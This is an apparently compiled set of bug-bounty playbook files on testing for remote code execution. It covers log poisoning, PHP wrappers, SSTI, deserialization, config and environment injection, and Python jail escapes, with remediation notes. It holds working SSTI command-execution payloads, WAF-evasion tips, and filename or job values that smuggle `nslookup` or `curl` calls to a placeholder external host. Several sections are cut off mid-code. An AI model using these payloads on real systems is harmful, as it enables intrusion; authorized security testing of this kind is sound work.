# rce-code-exec — part 1/17 (48 segment(s))
# content-aware dedupe applied; every unique entry preserved.

## [Bugbountyskills.md] V-08: LFI to RCE mutation via log file stalking (Apache/Nginx/SSH log injection)

**Mechanism:** Web and system logs record attacker-controlled bytes — request
line/URL, User-Agent, Referer, headers, HTTP-auth and SSH usernames, search
strings. Logs are inert data — until an LFI *includes* one: with a PHP
`include()`, a planted `<?php … ?>` inside `access.log` executes as app code.
Two trust assumptions break at once: "log files are not code" and "the include
target is safe". The RCE step needs no new vulnerability — only the LFI (V-01/
V-03/V-06) plus a predictable log path.

**Preconditions:**
- Confirmed read-LFI first (canary read works) — poisoning without LFI is a
  different bug class
- A writable log channel: User-Agent/URL/Referer/header logging (Apache/Nginx),
  username logging (SSH `auth.log`, mail), app-level logs (search, comments)
- Guessable log path (payloads.md §6) or leaked via phpinfo/error (chain
  `info-disclosure-testing`)
- **Execution** needs a code-bearing sink (`include`/`require`); `readFile`
  only reads — that's a read-proof, still a finding, not RCE

**Detect:**
1. Confirm read-LFI with a canary (V-01 ladder) — do this before anything else;
   it decides whether the ladder below matters.
2. Choose injectable channels per target: User-Agent (works almost everywhere),
   request path, Referer, POST bodies that get logged, `Authorization` username,
   SSH username (lab/approved scope only), app search/comment fields.
3. Inject a unique marker, one channel at a time:
   `User-Agent: LOGPOISON-<TOKEN>` — a **read-back proof** (safe in production).
   PHP-tagged bodies (`<?php echo …; ?>`) are **lab-only** per guardrail.
4. Probe candidate paths (payloads.md §6): `/var/log/apache2/access.log`,
   `/var/log/httpd/access_log`, `/var/log/apache/access.log`,
   `/var/log/nginx/access.log`, `/var/log/auth.log`,
   `C:\xampp\apache\logs\access.log`, app logs under `<APP_ROOT>/logs/`.
   Containers often log to stdout only — an ENOENT is data, not failure; note
   "logs not file-backed" and try `/proc/self/fd/1` style probes only as
   read-proofs.
5. Sequence matters: inject → immediately include → search the response for
   your token → inject a *different* token → re-include. Changing tokens prove
   causality; a static match proves nothing.
6. Classify the outcome: token echoed **literally** = LFI + attacker-controlled
   log content (read-proof; also an XSS-class primitive when pages render it —
   chain `xss-testing`). Token **executed** (output differs from input) = RCE
   path → demonstrate with one benign marker in a **lab clone**, report
   feasibility from production.
7. Follow log rotation: `access.log.1`, `access.log.2.gz` (gzip needs a filter
   chain — see payloads.md §2), date-suffixed names in containers.

**Proof of concept:**
```
1) curl -s -A 'LOGPOISON-<TOKEN>' 'https://<TARGET>/<ANY_LOGGED_ENDPOINT>'
2) GET /view?page=../../../../<PLACEHOLDER_LOG_PATH>
   → response contains LOGPOISON-<TOKEN>
3) re-inject LOGPOISON-<TOKEN2> → re-include → token2 (causality)
```

**Confirm:** The token appears via the include *and* changes when you inject a
new one (causality channel), **plus** the canary LFI still returns unrelated
content on demand (rules out "this endpoint always returns that log"). Two
signals, reproducible.

**False positives:** WAF/error pages echoing your User-Agent (mutate the token
— echo vs file content differ immediately). The page reflecting the stored
value *without* inclusion (test a control parameter that isn't included).
Wrong log path with an app fallback rendering your input. Scanner boilerplate
claiming "log poisoning RCE" where only a static log read happened. journald/
stdout-only containers with no access.log file (then this variant's file form
is dead — say so honestly). Log lines HTML-escaped on render (token appears
encoded → read is real, execution/XSS angle is not).

**Impact:** LFI→RCE as the web user when the include executes (full app
compromise — describe as feasibility if proven in lab); at read level:
attacker-controlled content served through app pages (XSS primitive) plus log
disclosure (privacy). Phrase per what you proved, never claim RCE off a
literal echo.

**Remediation:** Fix the LFI (allowlist include targets) — that alone kills the
chain; keep logs outside every include path with restrictive permissions; run
the app with `open_basedir`/FS scoping; disable code-bearing wrappers in PHP
config.

**CWE / OWASP:** CWE-117 (Log Injection) + CWE-98/CWE-22 (File Inclusion /
Traversal); OWASP A03:2021 Injection + A01:2021 Broken Access Control.

## [Bugbountyskills.md] V-09: LFI to RCE via PHP wrappers execution flow (php://filter, php://input, data://)

**Mechanism:** PHP stream wrappers redefine what "a path" means. `php://filter/
read=convert.base64-encode/resource=X` returns X *transformed* (source
disclosure without executing anything — the safe proof); `php://input` reads
the raw request body; `data://text/plain,…` supplies inline bytes; `zip://`,
`phar://`, `expect://` open other streams entirely. When user input becomes the
wrapper string, the violated assumption "a path is a filesystem location" —
and, for the executing wrappers, "file content is inert until a real file
exists".

**Preconditions:**
- PHP sink taking user path input: `include`, `readfile`, `file_get_contents`,
  `fopen`, `imagecreatefrom*` (some honor wrappers)
- Wrapper not disabled: `php://filter` works with plain reads (no
  `allow_url_include` needed — it's the reliable production probe);
  `php://input` / `data://` **inclusion** additionally needs
  `allow_url_include=On` (older/loosely-configured stacks — verify, never assume)
- No `://` rejection and no wrapper allowlist; `open_basedir` absent or loose

**Detect:**
1. Wrapper probe ladder, read-only first (payloads.md §2): submit
   `php://filter/convert.base64-encode/resource=<PLACEHOLDER_CANARY_PATH>` and
   base64-decode the response — expected: exact canary bytes. This single probe
   proves wrapper handling *and* delivers the impact proof safely.
2. Wrapper-support probe: `data://text/plain,WRAPPER-PROBE-<TOKEN>` — the token
   coming back means `data://` parses (note: your own text returns, so this
   proves wrapper support, *not* file read — don't confuse the two when writing up).
3. Read error taxonomy: "No such file" (path reaches the FS), "operation not
   supported" / "URL-file-access disabled" (wrapper exists but is restricted),
   value echoed unchanged (no wrapper processing at all). Each error names a
   different block — record it before escalating.
4. Relative-anchor variants: `php://filter/…/resource=<KNOWN_LOCAL_FILE>`
   inside the include dir, `/proc/self/cwd/<APP_FILE>` (cwd-relative anchor),
   `file://` prefix — useful when absolute paths are prefixed by the app.
5. Chain vectors for depth: `zip://<UPLOADED_FILE>#<ENTRY>` and `phar://…`
   (V-10/V-11 uploads) — read-only, and `phar://` metadata deserialization is a
   bonus class worth noting.
6. **Lab-only execution stage:** `php://input` with a POST body containing
   `<?php echo 'WRAPPER-OK'; ?>`, `data://text/plain;base64,PD9waHAg…`,
   `expect://id` — one benign marker in a lab clone. Production proof stops at
   the base64 read (guardrail).

**Proof of concept:**
```
GET /download?file=php://filter/convert.base64-encode/resource=<PLACEHOLDER_CANARY_PATH>
→ base64 response → decode → canary bytes          # read-only impact proof

## [Bugbountyskills.md] >> rce-testing — SKILL.md

*Source: `/root/Myskill/rce-testing/SKILL.md`*

## [Bugbountyskills.md] RCE Testing — Deep Playbook

Code execution bugs are the highest-severity class in most bug bounty
programs — and the easiest to over-claim. This skill makes the work
methodical: inventory sinks, pick the variant that matches the sink, probe
safely (callback or marker first, never a shell as a first step), confirm
with a second independent signal, prove impact with the minimum action
needed, and write reports that survive triage.

## [Bugbountyskills.md] >> rce-testing — payloads.md (request templates, tool commands, evasion)

*Source: `/root/Myskill/rce-testing/references/payloads.md`*

## [Bugbountyskills.md] Payloads & Templates — RCE

All payloads are templates with `<PLACEHOLDER>` slots. Fill them for the
specific engagement; never paste live third-party targets. The ladders here
are ordered by risk — climb only as far as authorization and impact proof
require.

## [Bugbountyskills.md] 2. SSTI fingerprinting ladder

**Stage 1 — marker arithmetic** (send each delimiter style; a computed `49`
means the input is template *source*, not a template *variable*):

```
{{7*7}}            ${7*7}            <%= 7*7 %>
#{7*7}             *{7*7}            #set($x=7*7)$x
```

If `{{7*7}}` reflects literally and `${7*7}` computes, the stack may be
Freemarker/Velocity-style — keep testing; literal echo is *not* a finding.

**Stage 2 — engine identification** (confirm which engine before crafting
anything deeper):

| Engine | Fingerprint probe | Expected tell |
|---|---|---|
| Jinja2 (Python) | `{{7*'7'}}` | `77777777` (Twig returns `49`) |
| Jinja2 alt | `{{config.items()}}` / `{{self}}` | Config/self dump or error naming Jinja |
| Twig (PHP) | `{{_self}}` | Twig environment dump (older versions leak `env`) |
| Freemarker | `<#assign x=7*7>${x}` | `49` via freemarker directives |
| Velocity | `#set($x=7*7)$x` | `49`; plain `${7*7}` usually stays literal |
| Pug (Node) | `#{7*7}` | `49`; also try `#{global.process}` errors |
| ERB (Ruby) | `<%= 7*7 %>` | `49` |
| Tornado (Python) | `{{1+1}}` | `2`; shares Python object model with Jinja |

**Stage 3 — read-only proof** (the impact proof, per the safe ladder — one
benign operation, nothing more):

```
Jinja2:  {{ cycler.__init__.__globals__.os.popen('whoami').read() }}
Twig:    {{ ['id']|filter('system') }}            (old Twig — lab versions)
Pug:     #{ global.process.mainModule.require('child_process').execSync('id') }
ERB:     <%= `whoami` %>
Freemarker: <#assign ex="freemarker.template.utility.Execute"?new()> ${ex("whoami")}
```

Production rule: `whoami` or a marker-file read is the ceiling; deeper
gadget-walking (subclass enumeration, `_self.env` chains) belongs in a lab
container. Evasion notes: `|attr('...')` and `['__cla'+'ss__']`-style
concatenation dodge WAFs on dunder names; triple-URL-encode since template
chars are WAF-hot.

## [Bugbountyskills.md] Deserialization gadget probing — LAB/authorized targets only, never prod

ysoserial.net payloads: URLDNS (OOB-only proof), CommonsCollections* (RCE — lab)
phpggc -l                                   # list PHP gadget chains

## [Bugbountyskills.md] >> rce-testing — variants-1.md (variant playbook)

*Source: `/root/Myskill/rce-testing/references/variants-1.md`*

## [Bugbountyskills.md] RCE Variants — Part 1 (V-01 … V-05)

Deep playbook sections for the first five variants. Work the **Detect**
steps in order, climb the ladders in `payloads.md` only as far as impact
proof requires, and check **False positives** before writing anything up.

## [Bugbountyskills.md] V-02: Language-specific code argument injection via dynamic code evaluators

**Mechanism:** User input is passed *as an argument* to a language-level
evaluator — `eval()`, `assert()` (PHP < 7.2 string form), Python `eval`/
`compile`, Node `Function()`/`vm.runInContext`, expression "calculators",
query-language fields. The input is not interpolated into code text; it *is*
the code — filters that strip syntax characters miss it because the
evaluator accepts the whole string.

**Preconditions:**
- A reachable feature evaluates input as code/expression (calculator,
  formula field, `where=`/`expr=` filters, "safe math" endpoints)
- Evaluator accepts strings (Python `eval` on user dict values is common;
  PHP `assert("...")` on old versions executes strings)
- For deep proof, language runtime must expose useful primitives — usually true

**Detect:**
1. Find evaluator-shaped params: `expr`, `formula`, `query`, `filter`,
   `calc`, `where`, `code`, `eval`, `callback`.
2. Safe probe: arithmetic markers per delimiter from `payloads.md` §2 —
   `{{7*7}}`, `7*7`, `{{7*7}}` in eval contexts; a computed `49`/value out
   of band proves evaluation.
3. Distinguish from SSTI (V-05): if the marker only computes when the engine
   is a template renderer (with template errors naming Jinja/Twig), route to
   V-05; if it's a plain expression field evaluated by app code, it's V-02.
4. Fingerprint the language from benign probes: `1/0` (exception type names
   the runtime), `type(1)` / `1..getClass()` (stack-frame language tell),
   `('a'*3)` vs `'a'*3` outputs.
5. Read-only proof for confirmation (lab depth in prod): Python
   `open('/etc/hostname').read()`; Node `global.process.version`; PHP
   `phpinfo()`-lite like `PHP_VERSION`. Keep to one marker.
6. Watch for WAFs tuned for `<script` but blind to `__import__`-style
   payloads — expression-context probes often sail through where HTML
   payloads don't; still, encode (`%2a` etc.) if the param is pre-filtered.

**Proof of concept:**
```
POST /api/calc HTTP/1.1
Content-Type: application/json

{"expr": "<PLACEHOLDER_EXPR>"}      # e.g. "7*7" → 49, then read-only marker
```

**Confirm:** Two independent signals — consistent computed arithmetic from
two different expressions *and* a read-only primitive (file marker read or
runtime-version call) returning environment-specific data that reflection
cannot fake.

**False positives:** JSONP `callback=` params executing *in the browser* are
client-side XSS, not server RCE (huge junior mix-up — route to `xss-testing`).
Calculators that regex-match simple `N*N` before evaluating prove nothing
about eval reachability. Client-side math in JS apps reflecting `49` from
`7*7` without any server involvement. WAFs echoing your payload into an
"invalid expression" page.

**Impact:** Arbitrary code in the app process — same blast radius as V-01
(secrets, data, network pivot), but often pre-auth if the evaluator is a
public tool. Phrase per the runtime and reachable features.

**Remediation:** Replace `eval`/string-`assert` with a dedicated expression
parser (grammar-restricted AST); if evaluation is unavoidable, run it in a
sandboxed interpreter with an allowlisted operator set and no I/O primitives.

**CWE / OWASP:** CWE-94 / CWE-95 (Eval Injection); OWASP A03:2021 Injection;
WSTG — Testing for Code Injection.

## [Bugbountyskills.md] V-03: Arbitrary object instantiation via insecure deserialization protocols

**Mechanism:** Attacker-controlled bytes reach a deserializer that
instantiates objects and runs lifecycle hooks (`readObject`, `__wakeup`,
`__destruct`, `unserialize` callbacks, pickled `__reduce__`, Marshal procs).
The trust assumption "serialized data is inert" is false: deserialization is
code execution whenever gadget classes exist on the classpath.

**Preconditions:**
- A deserialization entry point: signed-or-unsigned session cookies, `data=`
  params, message queues, uploaded blobs, SOAP/protobuf-ish wrappers
- Known framework/version (Java + commons-collections era, PHP apps with
  magic-method chains, Python pickle tokens, Ruby Marshal, Node
  `node-serialize`, .NET `BinaryFormatter`/`TypeConfuseDelegate`)
- No HMAC on the blob (signed cookies kill forgery — check first) and
  gadget classes present

**Detect:**
1. Harvest blobs: cookies (`session=`, `token=`), params, headers, storage
   URLs. Identify by magic: Java `rO0AB` (base64 of `AC ED`), PHP `O:8:"…"`
   / `C:`, Python `gASV…` (pickle protocol 4 `80 04`), Ruby `BAh7`,
   .NET `AAEAAAM…`, node-serialize JSON `{rce:"_$$ND_FUNC$$_…"}`.
2. Decode (base64/gzip) and confirm it's really serialized data, not
   JSON/protobuf — misidentification is the top false-positive source here.
3. Safe probe: an OOB-only gadget (URLDNS-class) pointing at
   `<PLACEHOLDER_OOB_DOMAIN>` — DNS resolution during deserialization proves
   the hook chain runs *without* code execution. This is the correct first
   step; never lead with an RCE gadget against production.
4. Fingerprint from errors: `ClassNotFoundException`, `__PHP_Incomplete_Class`,
   `TypeError` mentioning `__reduce__` — stack traces leak framework + class
   names to aim gadget availability.
5. PHP specifics: type-juggling probes, phpggc templates; error-based class
   enumeration. Java: ysoserial in **lab** against a version-matched clone.
6. Depth (lab/container only, per guardrail): develop/verify the RCE gadget
   chain against a clone — production proof stops at the OOB gadget + chain
   *feasibility* argument.

**Proof of concept:**
```
POST /api/load HTTP/1.1
Cookie: data=<PLACEHOLDER_SERIALIZED_BLOB>   # OOB gadget: http://<OOB_DOMAIN>/<TOKEN>
                                             # RCE gadget: lab only
```

**Confirm:** The collaborator receives a DNS query for your token URL (the
hook executed during deserialization) *and* a benign object round-trip shows
the app deserializes attacker-supplied bytes (e.g., a legitimate session
value you altered decodes on the server). Two signals, neither dependent on
assumed gadget availability.

**False positives:** Base64 blobs that decode to JSON/protobuf/UTF-16 —
always decode first. HMAC-signed cookies you can't forge (then it's not a
finding unless you find a signing-key leak — chain `info-disclosure-testing`).
DNS hits from your own client following redirects. Frameworks that
deserialize only after validating a checksum/magic (safe by design).

**Impact:** Gadget-chain RCE as the service process, frequently pre-auth when
cookies are unsigned; report as "deserialization gadget chain → RCE as
`<user>`, OOB proof at `<timestamp>`, chain demonstrated in lab". Do not paste
full RCE-gadget output from production.

**Remediation:** Replace serialization with data-only formats (JSON), or
HMAC-sign-and-verify blobs with constant-time compare plus a class allowlist;
upgrade/remove gadget-bearing libraries.

**CWE / OWASP:** CWE-502 (Deserialization of Untrusted Data); OWASP A08:2021
Software & Data Integrity Failures; WSTG — Testing for Deserialization.

## [Bugbountyskills.md] V-05: SSTI RCE via template engine fingerprinting

**Mechanism:** User input is concatenated into a template **source** that the
server renders. Template directives are executable code, so input escaping
is irrelevant — the violated assumption is "only developers write templates".
Crucial nuance: input passed as a template *variable* is normally escaped
and safe; only input that becomes template *source* (subject lines, custom
page builders, error templates, email previews) is exploitable.

**Preconditions:**
- Engine in stack: Jinja2/Tornado (Python), Twig/Smarty (PHP),
  Velocity/Freemarker (Java), Pug/Handlebars (Node), ERB (Ruby)
- User input lands in template source (or a context where directives parse)
- Some engine versions expose gadget paths (Twig `_self`, Freemarker
  `Execute`, Pug `global.process`)

**Detect:**
1. Stage 1 markers, all delimiter styles (payloads.md §2): `{{7*7}}`,
   `${7*7}`, `<%= 7*7 %>`, `#{7*7}`, `*{7*7}`, `#set($x=7*7)$x`. A computed
   `49` (or `7*7` result) = template-source context. Literal echo = not SSTI.
2. Stage 2 — fingerprint the engine before anything deeper: `{{7*'7'}}` →
   `77777777` = Jinja (Twig gives `49`); `{{_self}}` = Twig; `<#assign
   x=7*7>${x}` = Freemarker; `#set(...)` = Velocity; `#{7*7}` = Pug; stack
   traces naming `jinja2`/`twig`/`freemarker` seal it.
3. Overlap triage: `{{7*7}}` computing **in the browser** (Angular/Vue) is
   client-side template injection → `xss-testing`, not this variant.
4. Stage 3 — read-only proof (the impact ceiling for production): one
   `whoami` or marker-file read through the engine's gadget path
   (payloads.md §2 Stage 3 templates). Deeper gadget-walking = lab.
5. WAF evasion inline: dunder-name splits (`__cla''ss__`), `|attr('...')`
   access, `{% raw %}` wrapping, triple-URL-encoding — template chars are
   WAF-hot, so encoding layers are the norm, not the exception.

**Proof of concept:**
```
POST /preview HTTP/1.1
Content-Type: application/json

{"template": "Hello <PLACEHOLDER_TEMPLATE>"}   # stage1: {{7*7}} → 49
                                                # stage2: {{7*'7'}} → 77777777 (Jinja)
                                                # stage3: read-only whoami/markers
```

**Confirm:** Engine fingerprint from Stage 2 matches Stage 1 behavior (e.g.,
Jinja MRO/config tell) **and** a read-only primitive returns
environment-specific data (hostname/uid) — arithmetic alone can be mimicked
by calculators; two signals don't.

**False positives:** Client-side frameworks rendering `{{ }}` (see #3 — the
most common wrong report here). Markdown/math renderers evaluating plain
arithmetic. Input echoed literally with `{{7*7}}` intact. Twig/Jinja
autoescaping in variable contexts means `{{7*7}}` *as a value* proves
nothing — retest in source contexts (filenames, subjects, custom error
templates). Template sandboxing errors that *look* like execution — a
"not allowed" error is a blocked attempt, not a successful one.

**Impact:** SSTI is RCE via known gadget paths in most engines — report as
"RCE via SSTI in `<feature>`", evidence = engine fingerprint + read-only
command output; describe the escalation path (sandbox escape) rather than
performing it in production (then chain `sandbox-escape-testing`).

**Remediation:** Never build templates from user input — pass data as
context variables only; where user templates are a feature, run a sandboxed
engine (e.g., Jinja `SandboxedEnvironment`, Twig sandbox policy) with a
strict allowlist of filters/tags and no attribute access to dunders.

**CWE / OWASP:** CWE-1336 (Improper Neutralization of Special Elements in
Template Engine); OWASP A03:2021 Injection; WSTG — Testing for SSTI.

## [Bugbountyskills.md] >> rce-testing — variants-2.md (variant playbook)

*Source: `/root/Myskill/rce-testing/references/variants-2.md`*

## [Bugbountyskills.md] RCE Variants — Part 2 (V-06 … V-09)

Deep playbook sections for variants 6-9. Read `payloads.md` alongside these
for the shared ladders, encodings, and tool commands.

## [Bugbountyskills.md] V-06: RCE via memory corruption and garbage collection vulnerability triggers

**Mechanism:** Malformed input reaches a native parser (image/font/archive/
video codecs, XML/JSON-C parsers, compression libs) or a runtime's GC/
object machinery, triggering memory-safety bugs — buffer overflow, UAF,
double-free — or runtime-specific logic bugs. Controlled corruption is the
classic path to native code execution; uncontrolled corruption is at minimum
a crash/DoS. The violated assumption: "parsers treat files as data, never as
control flow".

**Preconditions:**
- Native parser in the request path (ImageMagick/GD, Ghostscript, libxml,
  zlib, harfbuzz/freetype, ffmpeg), attacker controls the file/field
- Vulnerable library version (identified via fingerprint/leak) with a
  known CVE or reproducible crash
- Enough parse depth allowed (size/type gates, sandboxed workers)

**Detect:**
1. Version fingerprint first: error strings naming the lib
   (`libpng error:`, `GIFLIB`, `Imagick X.Y`), `X-Powered-By`, EXIF writer
   tags, `Content-Type` sniffing paths, leaked dependencies (chain
   `info-disclosure-testing` for sourcemaps/package manifests).
2. Map CVE → payload: match the identified version against advisory
   databases (ImageTragick-class policy escapes, Ghostscript `-dSAFER`
   bypasses, font-parsing CVEs, decoder UAFs). Cite the CVE — an ID'd vuln
   plus reachability beats an unattributed crash.
3. Fuzz-lite with mutated files in **lab/staging** only: vary dimensions,
   chunk lengths, nesting, truncation; watch for worker restarts, segfault
   500s, latency cliffs. Never fuzz-loop production — that crosses into
   destructive territory.
4. GC-specific angles: deserialization GC pressure, refcount/refcycle bombs,
   parser recursion bombs — treat strictly as DoS unless a documented
   memory-corruption chain exists; report the crash class honestly.
5. Production line: prove *triggerability* only where explicitly permitted
   (a single reproducible crash on an in-scope staging box = valid DoS
   finding); on prod, stick to version+reachability evidence.

**Proof of concept:**
```
POST /api/image HTTP/1.1
Content-Type: multipart/form-data; boundary=<B>

## [Bugbountyskills.md] V-08: RCE via insecure configuration loading and variable override

**Mechanism:** The application or framework loads configuration from an
attacker-influenced source — uploadable config files, query-string/header
overrides (`auto_prepend_file`, `PHP_VALUE` via misrouted FastCGI params,
Spring `spring.config.import`/env overrides, `X-Forwarded-*`→settings
mappings), YAML/INI deserialization into settings — letting the attacker
flip security-relevant switches: enable debug, point template paths,
prepend a file, load a remote classpath, disable auth. The violated
assumption: "configuration is authored only by operators".

**Preconditions:**
- A controllable config surface: writable config dir, upload landing in
  config path, framework debug/env endpoint (Spring Actuator `/env`+
  `/refresh`), FastCGI `PHP_VALUE`/`PHP_ADMIN_VALUE` pass-through, query/
  header-driven settings, YAML config ingestion
- The setting you need is overridable (per-dir/per-request scope, not locked)

**Detect:**
1. Enumerate config surfaces: framework debug toggles (`?debug=true`,
   `X-Debug: 1`, Django `DEBUG`-adjacent headers), Actuator `/env`,
   `/configprops`, PHP `auto_prepend_file` params, `.env`/`config.php`
   uploads, mass-assignment onto config objects in JSON bodies.
2. FastCGI/`PHP_VALUE` test: set a *benign* observable value first —
   `PHP_VALUE=display_errors=1` then trigger an error; visible stack trace
   appearing where none did = override works (read-only-class proof).
   Prepend-file RCE (`auto_prepend_file=`) is the escalation — lab depth.
3. YAML/INI upload: land `debug: true` or a custom error-template path;
   observe the security-state change (stack traces on, custom page rendering
   your marker file).
4. Header→env/config mappings: `X-Forwarded-Prefix` (Spring app routing),
   `X-Original-URL`/`X-Rewrite-URL` (IIS/nginx rewrites — often auth bypass,
   note for `bac-idor-testing`), `Host`-driven absolute URL config.
5. Recon chain: leaked `.env`/`config.bak` via `info-disclosure-testing`
   tells you *which* settings exist and their names — use that inventory.

**Proof of concept:**
```
GET /page?debug=<PLACEHOLDER_VALUE> HTTP/1.1          # debug=true → stack trace appears
POST /upload config file: {debug: true, template: "<MARKER_PATH>"}   # behavior change
PHP-FPM: PHP_VALUE=display_errors=1                   # error visibility flip
```

**Confirm:** A **security-relevant** setting demonstrably changed by your
input — debug enabled where it wasn't, prepend executed rendering your
marker, template path overridden to your file — observed twice (before/after
diff on the same endpoint). Cosmetic config echoes don't count.

**False positives:** Debug already on for everyone (misconfiguration finding,
not injection — report the class correctly). Feature flags that are
cosmetic. Framework dev-mode toggles that require restart (your input did
nothing). WAF reflecting your param name. Actuator `/env` readable but
POST rejected (info disclosure only — route with `info-disclosure-testing`).

**Impact:** The escalation ladder: prepend-file/remote-classpath → RCE
(PHP `auto_prepend_file` from attacker URL, Spring property-source
injection), template-path override → file read/SSTI (V-05), debug-enabled →
internal exposure. State which rung you reached; don't claim prepend-RCE
without the benign proof.

**Remediation:** Load configuration only from trusted stores (files, secret
managers) with no request-time override; disable `PHP_VALUE` pass-through
(use `php_admin_value` locks in FPM pools), protect Actuator write
endpoints, and reject config-shaped query/header inputs by design.

**CWE / OWASP:** CWE-15 (External Control of System or Configuration
Setting); OWASP A05:2021 Security Misconfiguration (A03 where code
execution results).

## [Bugbountyskills.md] V-09: Blind RCE via system environment variable injections and shell expansion

**Mechanism:** Attacker input lands in environment variables or strings that
a *later* process expands through the shell — cron jobs, deploy scripts,
wrapper loops, `PATH`/`IFS`/`LD_*` manipulation, and expansion tricks
(`$(...)`/backticks inside unquoted expansions, globbing of crafted
filenames). Execution is deferred and blind: you plant the poison now; the
shell consumes it minutes or days later during a scheduled run — so no
in-band signal ever appears in the HTTP response.

**Preconditions:**
- Input stored then consumed by a shell-context process (jobs, exporters,
  watchers), or filenames created by upload that scripts later iterate
- Env override possible: HTTP headers mapped to env (CGI-era `HTTP_*`),
  config headers, job-param fields, `SetEnvIf` misconfig, container ENV
  from CI-controllable inputs
- The consuming script uses unquoted expansion (the classic sin)

**Detect:**
1. Map env/deferred surfaces: CGI-style header→env apps, features whose
   fields become job parameters ("schedule this", "export with name"),
   upload filenames later processed by shell loops, `Host`/`X-Forwarded-*`
   consumed by scripts (e.g., backup/cron scripts using `$HOST`).
2. Filename expansion probe (safe): upload a file literally named
   `` `nslookup <OOB_DOMAIN>.<TOKEN>`.jpg `` or
   `$(nslookup <OOB_DOMAIN>.<TOKEN>).png`. If a background job processes
   uploads via unquoted shell, the collaborator gets a hit — delayed by the
   job cadence, so watch for minutes, not seconds.
3. Stored-value deferred exec: set a job param to
   `$(curl http://<OOB_DOMAIN>/env-<TOKEN>)`, then trigger the consuming
   feature (manual "run now" button if present, else wait for schedule).
   Unique token per test — delayed hits arrive long after you forgot which
   payload was live.
4. Timing correlation is the in-band channel: record when you planted the
   poison and when the job normally runs (ask the program about schedules
   during triage if allowed); hit-time clustering on the schedule + a second
   plant-and-trigger cycle = two signals.
5. Escalation flags for the report (lab depth, never execute in prod):
   `PATH` shadowing (upload `./id` ahead of real `id`), `IFS` widening,
   `LD_PRELOAD` on setuid-ish paths, Windows `%COMSPEC%`/`%PATH%` expansion
   in scheduled tasks — describe the capability, don't weaponize.

**Proof of concept:**
```
POST /api/upload ...; filename="<PLACEHOLDER_FILENAME>"
   filename = `nslookup <PLACEHOLDER_OOB_DOMAIN>.<TOKEN>`.png

POST /api/jobs  {"name": "report-$(nslookup <PLACEHOLDER_OOB_DOMAIN>.<TOKEN>)"}
   → observe collaborator hit at <SCHEDULED_TIME>, repeat once
```

**Confirm:** Collaborator hit whose **timing correlates with job execution**
(not your request) with the token matching your planted value, **plus** a
reproducible second plant-and-trigger cycle. The blind/delayed nature is
why time-correlated double-signals matter most in this variant.

**False positives:** Your own earlier payloads firing later — unique tokens
per plant fix this. Email security scanners expanding and fetching URLs
stored in fields (hit UA/ASN = scanner, not the app's shell). Email-template
rendering of `${...}` (that's V-05 SSTI, not shell expansion). CMS
lazy-processing that only URL-decodes the filename (decode ≠ execution —
the collaborator hit is what separates them).

**Impact:** Deferred RCE as the job/cron user — frequently a higher
privilege than the web user (root in containers, deploy keys in CI boxes).
Phrase as "stored payload executed by scheduled job `<name>` as `<user>`,
OOB confirmed at `<timestamp>`". Explicitly note in the report that no
persistence was established and none is required to demonstrate impact
(guardrail).

**Remediation:** Never feed stored user data to shells — rewrite jobs with
argv arrays / language-native APIs, sanitize and rename filenames at upload,
quote every expansion in existing scripts, and minimize control flow
derived from environment or headers.

**CWE / OWASP:** CWE-78 (OS Command Injection, deferred) with CWE-454
(External Initialization of Trusted Variables); OWASP A03:2021 Injection.

## [Bugbountyskills.md] V-02: Python scope re-alignment via exec/eval context isolation breaks

**Mechanism:** Untrusted code runs in a "jailed" namespace (restricted
`__builtins__`, RestrictedPython, custom eval wrappers). Names are hidden,
but the object graph is shared: every object links back to `object`, so
`().__class__.__base__.__subclasses__()` enumerates every loaded class, and
MRO walks reach classes whose module globals hold `os`, `subprocess`, or
`warnings.catch_warnings.__init__.__globals__` — re-aligning scope to the
host interpreter. The violated assumption: "hiding dangerous names removes
dangerous capabilities."

**Preconditions:**
- A code sink: `eval`/`exec`/`compile`/RestrictedPython on attacker input
  (calculator, formula field, SSTI-adjacent features)
- Useful classes already imported (`os`, `subprocess`, `warnings` — true of
  any long-running web app)
- No OS-level confinement under the interpreter (Python's own docs: eval
  restrictions are not a security boundary)

**Detect:**
1. Confirm evaluation with a benign arithmetic marker (e.g. `7*7` → `49`).
2. Benign reach check: `len(().__class__.__base__.__subclasses__())` — a
   count, not a gadget walk. A large count (>20) means the class graph is
   intact (confined-but-connected); `0`/error means deeper restriction.
3. Fingerprint the interpreter benignly: `__import__('sys').version` if
   `__import__` survived, else from leaked source/lockfiles/stack traces
   (`type(sys.last_value)` names the runtime).
4. Check what lies *under* the jail (is the process in a container? seccomp?
   non-root?) — this decides severity, and it is what juniors forget to ask.
5. In **lab** only: walk the subclass list against known jail-escape chain
   shapes (public research: `os._wrap_close`, `catch_warnings` globals) and
   land the benign proof rung.

**Proof of concept:**
```
POST /api/calc HTTP/1.1
Content-Type: application/json

{"expr": "<PLACEHOLDER_EXPR>"}

rung 1 (benign): 7*7                                              → 49
rung 2 (benign): len(().__class__.__base__.__subclasses__())       → count
rung 3 (benign): __import__('sys').version                        → "3.x.y"
rung 4 (lab only): subclass/globals chain → open('/tmp/<MARKER>').read()
```

**Confirm:** Interpreter version string (env-unique, reflection can't fake
it) *plus* the subclass-count differential showing a connected object graph
— and, in lab, the benign marker read from the public chain shape.
Reproduce twice.

**False positives:** "name 'os' is not defined" after your probe — that is
*expected* under the jail and proves nothing about safety (the whole point of
this variant is that names ≠ capability). Subclass list exists but no
dangerous classes loaded (fresh/lean interpreter — chain not available;
report as hardening gap). RestrictedPython or a similar library is in use
*and the program documents itself as non-security* (it isn't one — but scope
the finding as "eval sink = RCE", route to `rce-testing`). Client-side
math evaluating `49` in the browser.

**Impact:** Arbitrary Python in the app process → OS command execution as
the service user; report as "sandboxed eval escape (restricted builtins) →
RCE as `<user>`", noting the OS layer below (containerized? root?).

**Remediation:** Do not eval untrusted code inside the app process at all —
run it in a separate, non-root, seccomp-confined container with no network
and a read-only filesystem; if evaluation must stay, replace it with a
grammar-restricted expression parser.

**CWE / OWASP:** CWE-94 (Eval Injection) / CWE-693 (Protection Mechanism
Failure); OWASP A03:2021 Injection; WSTG — Testing for Code Injection.

### [Bugbountyskills.md] 2.8 Indirect-eval sink context (V-13)

```javascript
<PROOF>()                                   <!-- direct expression slot -->
alert(document.domain)//                    <!-- JSONP-style callback param -->
');<PROOF>();//                             <!-- string that closes into eval'd code -->
1; setTimeout("<PROOF>()", 100)             <!-- only if the sink passes a string through -->
```

## [Bugbountyskills.md] V-13: Indirect string evaluation sinks (bypassing via evaluation functions)

